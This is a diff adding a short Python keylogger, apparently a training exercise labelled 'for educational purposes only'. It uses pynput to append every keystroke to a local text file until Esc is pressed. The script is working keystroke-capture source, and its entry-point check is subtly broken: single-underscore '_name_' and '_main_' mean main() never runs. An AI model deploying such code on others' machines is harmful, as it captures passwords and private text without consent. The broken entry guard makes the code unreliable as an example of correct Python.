@@ -1,0 +1,48 @@
+from pynput import keyboard as kb
+
+ 
+# File to store the keystrokes
+LOG_FILE = r"C:\\Task 4\\abc.txt"
+
+def on_press(key):
+    """
+    Callback function to handle key press events.
+    """
+    try:
+        with open(LOG_FILE, "a") as log_file:
+            log_file.write(key.char)
+    except AttributeError:
+        with open(LOG_FILE, "a") as log_file:
+            log_file.write(f" [{key}] ")
+
+def on_release(key):
+    """
+    Callback function to handle key release events.
+    """
+    if key == kb.Key.esc:
+        return False
+
+def start_keylogger():
+    """
+    Starts the keylogger.
+    """
+    print("Starting keylogger... Press 'Esc' to stop.")
+    
+    # Listener for keyboard events
+    with kb.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+def main():
+    print("Keylogger Tool (For Educational Purposes Only)")
+    print("---------------------------------------------")
+    
+    try:
+        # Start the keylogger
+        start_keylogger()
+    except KeyboardInterrupt:
+        print("\n[!] Keylogger stopped.")
+    except Exception as e:
+        print(f"[!] Error: {e}")
+
+if _name_ == "_main_":
+    main()
